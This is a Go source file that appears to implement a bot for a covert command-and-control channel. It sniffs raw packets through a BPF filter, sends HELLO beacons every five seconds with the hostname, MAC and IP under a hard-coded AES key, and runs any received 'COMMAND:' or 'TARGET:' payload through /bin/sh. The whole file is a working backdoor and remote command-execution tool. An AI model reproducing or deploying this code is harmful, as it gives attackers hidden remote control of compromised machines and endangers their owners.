package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"os"
	"strings"
	"strconv"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"

	"golang.org/x/sys/unix"
	"golang.org/x/net/bpf"
)

var debugCheck string = ""




// FilterRaw is a BPF struct containing raw instructions.
// Generate with tcpdump udp and port 56969 -dd
// or whatever filter you would like to generate

// tcpdump udp port 80 -dd
var FilterRaw = []bpf.RawInstruction{
{ 0x28, 0, 0, 0x0000000c },
{ 0x15, 0, 6, 0x000086dd },
{ 0x30, 0, 0, 0x00000014 },
{ 0x15, 0, 15, 0x00000011 },
{ 0x28, 0, 0, 0x00000036 },
{ 0x15, 12, 0, 0x00000050 },
{ 0x28, 0, 0, 0x00000038 },
{ 0x15, 10, 11, 0x00000050 },
{ 0x15, 0, 10, 0x00000800 },
{ 0x30, 0, 0, 0x00000017 },
{ 0x15, 0, 8, 0x00000011 },
{ 0x28, 0, 0, 0x00000014 },
{ 0x45, 6, 0, 0x00001fff },
{ 0xb1, 0, 0, 0x0000000e },
{ 0x48, 0, 0, 0x0000000e },
{ 0x15, 2, 0, 0x00000050 },
{ 0x48, 0, 0, 0x00000010 },
{ 0x15, 0, 1, 0x00000050 },
{ 0x6, 0, 0, 0x00040000 },
{ 0x6, 0, 0, 0x00000000 },
}



// Function to do this err checking repeatedly
func checkEr(err error) {
	if err != nil {
		if debugCheck != "" { fmt.Println("[-] ERROR:",err) }
		log.Fatal(err)
		
	}
}

// htons converts a short (uint16) from host-to-network byte order.
// #Stackoverflow
func htons(i uint16) uint16 {
	return (i<<8)&0xff00 | i>>8
}


// BotReadPacket reads packets from a socket file descriptor (fd)
//
// fd  	--> file descriptor that relates to the socket created in main
// vm 	--> BPF VM that contains the BPF Program
//
// Returns 	--> None
func BotReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {

	// Buffer for packet data that is read in
	buf := make([]byte, 1500)

	// Read in the packets
	// num 		--> number of bytes
	// sockaddr --> the sockaddr struct that the packet was read from
	// err 		--> was there an error?
	_, _, err := unix.Recvfrom(fd, buf, 0)

	checkEr(err)

	// Filter packet?
	// numBytes	--> Number of bytes
	// err	--> Error you say?
	numBytes, err := vm.Run(buf)
	checkEr(err)
	if numBytes == 0 {
		// Change "continue" to return for routine logic
		return nil, false // 0 means that the packet should be dropped
		// Here we are just "ignoring" the packet and moving on to the next one
	}

	// Parse packet... hopefully
	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
		// Make sure this is my packet
		if strings.Contains(string(packet.ApplicationLayer().Payload()), "COMMAND:") {
			return packet, false
		} else if strings.Contains(string(packet.ApplicationLayer().Payload()), "TARGET:") {
			return packet, true
		}
		return nil, false
	}
	return nil, false
}

// CreateAddrStruct creates a "syscall.ScokaddrLinklayer" struct used
//	for binding the socket to an interface
//
// ifaceInfo	--> net.Interface pointer
//
// Returns		--> syscall.SockaddrLinklayer struct
func CreateAddrStruct(ifaceInfo *net.Interface) (addr unix.SockaddrLinklayer) {
	// Create a byte array for the MAC Addr
	var haddr [8]byte

	// Copy the MAC from the interface struct in the new array
	copy(haddr[0:7], ifaceInfo.HardwareAddr[0:7])

	// Initialize the Sockaddr struct
	addr = unix.SockaddrLinklayer{
		Protocol: unix.ETH_P_IP,
		Ifindex:  ifaceInfo.Index,
		Halen:    uint8(len(ifaceInfo.HardwareAddr)),
		Addr:     haddr,
	}

	return addr
}

// SendPacket sends a packet using a provided
//	socket file descriptor (fd)
//
// fd 			--> The file descriptor for the socket to use
// ifaceInfo	--> pointer to net.Interface struct
// addr			--> struct from CreateAddrStruct()
// packetdata	--> The packet to send
//
// Returns 	--> None
func SendPacket(fd int, ifaceInfo *net.Interface, addr unix.SockaddrLinklayer, packetData []byte) {

	// Bind the socket
	checkEr(unix.Bind(fd, &addr))

	_, err := unix.Write(fd, packetData)
	checkEr(err)
}

// CreatePacket takes a net.Interface pointer to access
// 	things like the MAC Address... and yeah... the MAC Address
//
// ifaceInfo	--> pointer to a net.Interface
//
// Returns		--> Byte array that is a properly formed/serialized packet
func CreatePacket(ifaceInfo *net.Interface, srcIp net.IP,
	dstIP net.IP, srcPort int, dstPort int, dstMAC net.HardwareAddr, payload string) (packetData []byte) {

	// Buffer to building our packet
	buf := gopacket.NewSerializeBuffer()

	// Generate options
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	// Ethernet layer
	ethernet := &layers.Ethernet{
		EthernetType: layers.EthernetTypeIPv4,
		SrcMAC:       ifaceInfo.HardwareAddr,
		DstMAC:       dstMAC,
	}
	// IPv4 layer
	ip := &layers.IPv4{
		Version:    0x4,
		IHL:        5,
		TTL:        255,
		Flags:      0x40,
		FragOffset: 0,
		Protocol:   unix.IPPROTO_UDP, // Sending a UDP Packet
		DstIP:      dstIP,            //net.IPv4(),
		SrcIP:      srcIp,            //net.IPv4(),
	}
	// UDP layer
	udp := &layers.UDP{
		SrcPort: layers.UDPPort(srcPort), // No Random Port
		DstPort: layers.UDPPort(dstPort), // Saw this used in some code @github... seems legit
	}

	// Checksum calculations
	udp.SetNetworkLayerForChecksum(ip)

	checkEr(gopacket.SerializeLayers(buf, opts, ethernet, ip, udp, gopacket.Payload(payload)))

	// Save the newly formed packet and return it
	packetData = buf.Bytes()

	return packetData
}

// CreateBPFVM creates a BPF VM that contains a BPF program
// 	given by the user in the form of "[]bpf.RawInstruction".
// You can create this by using "tcpdump -dd [your filter here]"
//
// filter	--> Raw BPF instructions generated from tcpdump
//
// Returns	--> Pointer to a BPF VM containing the filter/program
func CreateBPFVM(filter []bpf.RawInstruction) (vm *bpf.VM) {

	// Disassemble the raw instructions so we can pass them to a VM
	insts, allDecoded := bpf.Disassemble(filter)
	if allDecoded != true {
		log.Fatal("Error decoding BPF instructions...")
	}

	vm, err := bpf.NewVM(insts)
	checkEr(err)

	return vm
}

// NewSocket creates a new RAW socket and returns the file descriptor
//
// Returns --> File descriptor for the raw socket
func NewSocket() (fd int) {

	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(htons(unix.ETH_P_ALL)))
	checkEr(err)

	return fd
}

// GetOutboundIP finds the outbound IP addr for the machine
//
// addr		--> The IP you want to be able to reach from an interface
//
// Returns	--> IP address in form "XXX.XXX.XXX.XXX"
func getOutboundIP(addr string) net.IP {
	conn, err := net.Dial("udp", addr)
	checkEr(err)

	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP
}

// GetOutwardIface determines the interface associated with
// sending traffic out on the wire and returns a *net.Interface struct
//
// addr		--> The IP you want to be able to reach from an interface
//
// Returns	--> *net.Interface struct of outward interface
//			--> net.IP used for creating a packet
func GetOutwardIface(addr string) (byNameiface *net.Interface, ip net.IP) {
	outboundIP := getOutboundIP(addr)

	ifaces, err := net.Interfaces()
	checkEr(err)

	for _, i := range ifaces {

		byNameiface, err := net.InterfaceByName(i.Name)
		checkEr(err)

		addrs, _ := byNameiface.Addrs()

		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if bytes.Compare(outboundIP, ipnet.IP.To4()) == 0 {
					ip := ipnet.IP.To4()
					return byNameiface, ip
				}
			}
		}
	}

	return
}

// GetRouterMAC gets the default gateway MAC addr from the system
//
// Returns 	--> MAC addr of the gateway of type net.HardwareAddr
//
// Credit: Milkshak3s & Cictrone
func GetRouterMAC(iface string) (net.HardwareAddr, error) {
	// get the default gateway address from routes
	gatewayAddr := ""
	fRoute, err := os.Open("/proc/net/route")
	if err != nil {
		return nil, err
	}
	defer fRoute.Close()

	s := bufio.NewScanner(fRoute)
	s.Scan()

	for s.Scan() {
		line := s.Text()
		fields := strings.Fields(line)
		if fields[1] == "00000000" && fields[0] == iface { 
			decode, err := hex.DecodeString(fields[2])
			if err != nil {
				return nil, err
			}

			gatewayAddr = fmt.Sprintf("%v.%v.%v.%v", decode[3], decode[2], decode[1], decode[0])
		}
	}

	if gatewayAddr == "" {
		return nil, errors.New("no gateway found in routes")
	}

	// look through arp tables for match to gateway address
	fArp, err := os.Open("/proc/net/arp")
	if err != nil {
		return nil, err
	}
	defer fArp.Close()

	s = bufio.NewScanner(fArp)
	s.Scan()

	for s.Scan() {
		line := s.Text()
		fields := strings.Fields(line)
		if fields[0] == gatewayAddr {
			return net.ParseMAC(fields[3])
		}
	}

	return nil, errors.New("no gateway found")
}

// CreateHello creates a HELLO string for callbacks
// HELLO format:
//
//	HELLO: hostname hostMAC hostIP
//
//	*NOTE* hostMAC and hostIP will end up being the MAC/IP of the gateway
//			we are dealing with NAT. This will be handled by the C2 parsing
func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {


	//get hostname
	hostname, err := os.Hostname()
	if err != nil {
		log.Fatal("[-] Hostname not found...")
	}

	//create base text
	hello = "HELLO:" + "#" + hostname + "#" + hostMAC.String() + "#" + srcIP.String()
	
	//Encrypt Command
	if debugCheck != "" { fmt.Printf("[]Attempting to encrypt: %s\n", os.Args[2]) }
	plaintext := []byte(os.Args[2])
	key := []byte("pooppooppooppoop")
	ciphertext, err := encrypt(plaintext, key)
	if err != nil {
		panic(err)
	}
	if debugCheck != "" { fmt.Printf("[+]Encrypted: %x\n", ciphertext) }
	hello += "#" + string(ciphertext)

	for i := 3; i < len(os.Args); i++ {
		hello += "#" + os.Args[i]
		if debugCheck != "" { fmt.Printf("[+]Added optional commands: %s\n", os.Args[i]) }
	}


	if debugCheck != "" { fmt.Println("[+] Payload Created:", hello) }

	return hello
}

func encrypt(plaintext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Generate a random initialization vector (IV)
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	// Encrypt the plaintext using AES in CBC mode
	mode := cipher.NewCBCEncrypter(block, iv)
	padded := pad(plaintext, aes.BlockSize)
	ciphertext := make([]byte, len(padded))
	mode.CryptBlocks(ciphertext, padded)

	// Prepend the IV to the ciphertext
	ciphertext = append(iv, ciphertext...)

	return ciphertext, nil
}

func pad(data []byte, blockSize int) []byte {
	padding := blockSize - (len(data) % blockSize)
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...)
}


//========================

var lastCmdRan string

// Continuously send HELLO messages so that the C2 can respond with commands
func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
	for {
		
		if debugCheck != "" { fmt.Println("[+] iface:", iface) }
		if debugCheck != "" { fmt.Println("[+] src:", src) }
		if debugCheck != "" { fmt.Println("[+] dst:", dst) }
		if debugCheck != "" { fmt.Println("[+] dstMac:", dstMAC) }

		fd := NewSocket()
		defer unix.Close(fd)
		
		
		packet := CreatePacket(iface, src, dst, 47135, 80, dstMAC, CreateHello(iface.HardwareAddr, src))
		tmpPacket := gopacket.NewPacket(packet, layers.LayerTypeEthernet, gopacket.Default)
		//data := string(packet.ApplicationLayer().Payload())
		
		if debugCheck != "" { fmt.Println("[+] packet:", tmpPacket.String()) }

		addr := CreateAddrStruct(iface)
		
		if debugCheck != "" { fmt.Println("[+] addr:", addr) }

		SendPacket(fd, iface, addr, packet)
		if debugCheck != "" { fmt.Println("[+] Sent HELLO to:", dst) }
		// Send hello every 5 seconds
		time.Sleep(5 * time.Second)
	}
}

func botProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {

	if debugCheck != "" { fmt.Println("[+] Payload Received") }

	// Get command payload and trime newline
	data := string(packet.ApplicationLayer().Payload())
	data = strings.Trim(data, "\n")

	// Split into list to get command and args
	payload := strings.Split(data, " ")
	if debugCheck != "" { fmt.Println("[+] PAYLOAD:", payload) }

	// Check if target command
	if target {
		if payload[1] == hostIP.String() {
			if debugCheck != "" { fmt.Println("[+] TARGET COMMAND RECEIVED") }
			command := strings.Join(payload[2:], " ")
			execCommand(command)
		}
	} else 
{		// Split the string to get the important parts
		// splitcommands := payload[1:]
		// Rejoin string to put into a single bash command string
		command := strings.Join(payload[1:], " ")
		execCommand(command)
	}
}

func execCommand(command string) {
	// Only run command if we didn't just run it
	if lastCmdRan != command {
		if debugCheck != "" { fmt.Println("[+] COMMAND:", command) }

		// Run the command and get output
		out, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
		if err != nil {
			if debugCheck != "" { fmt.Println("\n[-] ERROR:", err) }
		}
		// Save last command we just ran
		lastCmdRan = command
		if debugCheck != "" { fmt.Println("[+] OUTPUT:", string(out)) }
	} else {
		if debugCheck != "" { fmt.Println("[!] Already ran command", command) }
	}

}


// Function that takes a string representation of a single IP address, IP range, or VLSM network
// and returns an array of all the individual IP addresses contained within.
func getIPs(ipStr string) ([]string, error) {
	var ips []string

	// Check if the input is a valid IP address
	ip := net.ParseIP(ipStr)
	if ip != nil {
		// If the input is a single IP address, add it to the list and return it
		ips = append(ips, ip.String())
		return ips, nil
	}

	// Check if the input is an IP range in CIDR notation
	_, ipnet, err := net.ParseCIDR(ipStr)
	if err == nil {
		// If the input is an IP range, iterate over all the IP addresses in the range
		for ip := ipnet.IP.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
			ips = append(ips, ip.String())
		}
		return ips, nil
	}

	// Check if the input is a VLSM network in the format "192.168.0.0/24=16,32"
	parts := strings.Split(ipStr, "=")
	if len(parts) != 2 {
		// If the input is not a valid IP address, IP range, or VLSM network, return an empty list
		return ips, fmt.Errorf("invalid input: %s", ipStr)
	}

	// Parse the base network and subnet mask from the first part of the input
	_, ipnet, err = net.ParseCIDR(parts[0])
	if err != nil {
		return ips, fmt.Errorf("invalid input: %s", ipStr)
	}

	// Parse the comma-separated list of subnet sizes from the second part of the input
	subnets := strings.Split(parts[1], ",")
	for _, subnetStr := range subnets {
		// Parse the subnet size and calculate the number of IP addresses it contains
		subnetSize, err := strconv.ParseInt(subnetStr, 10, 64)
		if err != nil {
			return ips, fmt.Errorf("invalid input: %s", ipStr)
		}
		numIps := 1 << uint32(32-subnetSize)

		// Iterate over all the IP addresses in the subnet and add them to the list
		for i := 0; i < numIps; i++ {
			ip := ipnet.IP.To4()
			ip = net.IPv4(ip[0], ip[1], ip[2], ip[3]+byte(i))
			ips = append(ips, fmt.Sprintf("%s/32", ip.String()))
		}

		// Move the IP network to the next subnet
		inc(ipnet.IP)
	}

	return ips, nil
}

// Function to increment an IP address by one
func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func main() {



	
	//Vaidate parameters
	if len(os.Args) < 3 {
        	fmt.Println("Usage: myprogram <ip address, range, or vlsm> \"<command>\" \"<ping[optional]>\" \"<debug[optional]>\"") 
       	 	os.Exit(1)
   	 }
   	 
	// Get passed arguments
	// 1 = debug (any string)
	fmt.Println("LEN: ",len(os.Args) ) 
   	 if len(os.Args) >= 5 {
   	 	if os.Args[4] == "1" {
			debugCheck = os.Args[4]
		}
	} 
	
	// // Check for valid IP
	// ip := net.ParseIP(os.Args[1])
	// if ip == nil {
    //     	if debugCheck != "" { fmt.Println("[-]Invalid IP address:", os.Args[1]) }
    //     	os.Exit(1)
    // 	}


    ips, err := getIPs(os.Args[1])
	if err == nil {
		for _, ip := range ips {
			//remove whitespace from either side
			cleanIP := strings.TrimSpace(ip)
			if debugCheck != "" { fmt.Println("[+] IP Parsed: ", ip) }



			// Create reading socket
			readfd := NewSocket()
			defer unix.Close(readfd)

			if debugCheck != "" { fmt.Println("[+] Socket created") }

			// Get information that is needed for networking
			
			tmp := cleanIP+":80"
			iface, src := GetOutwardIface(tmp)
			fmt.Println("[+] Using interface:", iface.Name)

			dstMAC, err := GetRouterMAC(iface.Name)
			if err != nil {
				log.Fatal(err)
			}
			if debugCheck != "" { fmt.Println("[+] DST MAC:", dstMAC.String()) }
			if debugCheck != "" { fmt.Println("[+] Starting HELLO timer") }

			// Start hello timer
			// Set the below IP to the IP of the C2
			// 192.168.4.6
		/*	macStr := "00:1b:17:00:01:11"
			dstMAC,err = net.ParseMAC(macStr)
			if err != nil {
		       	 fmt.Println("Error parsing MAC address:", err)
		        	return
		    	}
		*/


			if debugCheck != "" { fmt.Println("[+] DST IP:", cleanIP) }
			ip := net.ParseIP(cleanIP).To4()
			if ip == nil {
				if debugCheck != "" { fmt.Println("[-] CANT PARSE IP:") }
			}
			if debugCheck != "" { fmt.Println("[+] DST IP OBJECT:", ip.String()) }
			
			go sendHello(iface, src, ip, dstMAC)
			//if debugCheck != "" { fmt.Println("[+] DST IP OBJECT DETAIL %s %s %s %s:" ip[12], ip[13], ip[14], ip[15]) }
			//go sendHello(iface, src, net.IPv4(ip[12], ip[13], ip[14], ip[15]), dstMAC)

			// Create BPF filter vm
			vm := CreateBPFVM(FilterRaw)

			// Listen for responses
			if debugCheck != "" { fmt.Println("[+] Listening") }
			for {
				packet, target := BotReadPacket(readfd, vm)
				if packet != nil {
					go botProcessPacket(packet, target, src)
				}
			}
		}
	}

}
